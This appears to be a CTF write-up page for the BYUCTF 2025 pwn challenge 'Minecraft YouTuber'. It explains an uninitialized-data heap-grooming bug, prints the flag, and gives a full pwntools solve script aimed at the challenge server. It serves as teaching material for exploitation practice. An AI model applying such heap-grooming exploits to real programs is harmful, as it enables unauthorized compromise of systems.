@@ -1,0 +1,130 @@
+---
+title: "Minecraft YouTuber — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-minecraft-youtuber"
+order: 268
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# Minecraft YouTuber — BYUCTF 2025
+
+> **Category:** `Binary Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{th3_3xpl01t_n4m3_1s_l1t3r4lly_gr00m1ng}`  
+> **Source Path:** `pwn/minecraft_youtube`
+
+---
+
+## Challenge Description
+
+```text
+Oh boy, I hit a million subscribers on YouTube, what do I do now?
+
+`nc minecraft.chal.cyberjousting.com 1354`
+
+[minecraft] [minecraft.c] [Dockerfile]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/pwn/minecraft_youtube)
+- [pwn/minecraft_youtube/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/minecraft_youtube/README.md)
+- [pwn/minecraft_youtube/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/minecraft_youtube/solve.py)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Binary Exploitation challenge **Minecraft YouTuber**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [pwn/minecraft_youtube/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/minecraft_youtube/README.md)
+
+Basically the idea here is that it's an uninitialized data use vulnerability and you can "groom" the Heap to make the keycard value be what you want it to be (0x1337). The uid is kind of a red herring. You just have to spam gear until you get a name tag, set it to what you want it to be, and then win.
+
+See `solve.py`.
+
+**Flag** - `byuctf{th3_3xpl01t_n4m3_1s_l1t3r4lly_gr00m1ng}`
+
+---
+
+## Full Exploit Script
+
+Source: [pwn/minecraft_youtube/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/minecraft_youtube/solve.py)
+
+```python
+from pwn import *
+
+# initialize the binary and set the context (architecture, etc.)
+binary = "./src/minecraft" # ensure it is executable (chmod +x)
+elf = context.binary = ELF(binary, checksec=False)
+
+gs = """
+break main
+continue
+"""
+
+# run with python3 solve.py REMOTE
+if args.REMOTE:
+    p = remote("minecraft.chal.cyberjousting.com", 1354)
+
+# run with python3 solve.py GDB
+elif args.GDB:
+    # having issues with gdb showing up? install and run `tmux` before running this script, then uncomment this:
+    context.terminal = ["tmux", "splitw", "-h"]
+
+    p = gdb.debug(binary, gdbscript=gs)
+
+# run with python3 solve.py
+else:
+    p = elf.process()
+
+
+### START HERE ###
+
+p.recvuntil(b"username now: \n")
+p.sendline(b"urmom")
+
+line = b""
+while b"Tag" not in line:
+    p.recvuntil(b"Leave\n")
+    p.sendline(b"3")
+    line = p.recvline()
+
+p.sendline(b"urmom")
+p.sendline(p64(0x1337))
+
+p.recvuntil(b"Leave\n")
+p.sendline(b"5")
+p.recvuntil(b". \n")
+
+p.recvuntil(b"username now: \n")
+p.sendline(b"urmom")
+
+p.recvuntil(b"Leave\n")
+p.sendline(b"7")
+
+p.interactive()
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
